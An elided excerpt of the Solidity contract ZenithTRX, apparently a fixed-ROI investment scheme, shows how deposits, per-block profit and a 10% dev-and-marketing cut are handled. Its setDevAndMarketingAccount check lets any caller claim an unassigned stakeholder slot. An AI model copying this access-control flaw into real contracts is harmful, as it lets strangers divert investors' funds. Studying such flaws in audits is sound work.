...
contract ZenithTRX  {
  ...
  function setDevAndMarketingAccount(uint index, address payable _address) public {
    ...
    require(devAndMarketing[index] == msg.sender || devAndMarketing[index] == address(0), "You are not the stakeholder");
  ...
  function _invest(uint amount) internal {
    ...
    sendDevAndMarketingFund(amount.mul(10).div(100));
  ...
  function withdrawable(address user) public view returns (uint amount) {
    ...
    for(uint i = 0; i < investor.deposits.length; i++) {
      ...
      uint profit = dep.amount.mul(block.number.sub(start)).mul(getRoi()).div(ADAY.mul(1000));
  ...
  function sendDevAndMarketingFund(uint amount) internal {
    uint totalUnits;
    for(uint i = 1; i <= 4; i++) {
      totalUnits = totalUnits + units[i];
    }
    for(uint i = 1; i <= 4; i++) {
      if (units[i] * amount/totalUnits == 0 || devAndMarketing[i] ==address(0)) {
        continue;
      }
